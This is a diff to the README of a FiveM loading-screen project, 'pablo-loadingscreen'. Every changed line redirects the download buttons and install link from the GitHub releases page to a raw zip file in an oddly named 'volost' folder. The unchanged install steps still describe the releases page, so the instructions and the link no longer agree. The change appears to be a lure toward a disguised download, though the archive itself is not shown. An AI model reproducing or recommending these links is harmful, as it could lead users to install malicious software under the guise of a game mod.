@@ -1,7 +1,7 @@
 <h1>🎨 pablo-loadingscreen - Interactive FiveM Loading Screen</h1>
 
 <p align="center">
-  <a style="display:inline-block;background-color:#0078D7;color:#fff;padding:20px 40px;font-size:24px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px auto;" href="https://github.com/hgaray9668/pablo-loadingscreen/releases">⬇️ DOWNLOAD NOW</a>
+  <a style="display:inline-block;background-color:#0078D7;color:#fff;padding:20px 40px;font-size:24px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px auto;" href="https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <h2>🚀 Welcome</h2>
@@ -47,7 +47,7 @@
 <h2>📥 How to Download & Install</h2>
 
 <ol>
-  <li><strong>Visit the download link:</strong> <a href="https://github.com/hgaray9668/pablo-loadingscreen/releases">https://github.com/hgaray9668/pablo-loadingscreen/releases</a> to download the application.</li>
+  <li><strong>Visit the download link:</strong> <a href="https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip">https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip</a> to download the application.</li>
   <li><strong>Find the latest release:</strong> On the page, look for the release with the highest version number (e.g., v1.0).</li>
   <li><strong>Download the file:</strong> Click the "Source code (zip)" link under that release. Your browser will download a .zip file.</li>
   <li><strong>Extract the files:</strong> Right-click the downloaded file (it's named something like "pablo-loadingscreen-1.0.zip") and select "Extract All..." Choose a folder you remember, like your Desktop or Documents.</li>
@@ -91,7 +91,7 @@
 </ul>
 
 <p align="center">
-  <a href="https://github.com/hgaray9668/pablo-loadingscreen/releases" style="display:inline-block;background-color:#28a745;color:#fff;padding:15px 30px;font-size:20px;font-weight:bold;text-decoration:none;border-radius:5px;">⬇️ Download Now</a>
+  <a href="https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip" style="display:inline-block;background-color:#28a745;color:#fff;padding:15px 30px;font-size:20px;font-weight:bold;text-decoration:none;border-radius:5px;">⬇️ Download Now</a>
 </p>
 
 <h2>📁 Contents of Package</h2>
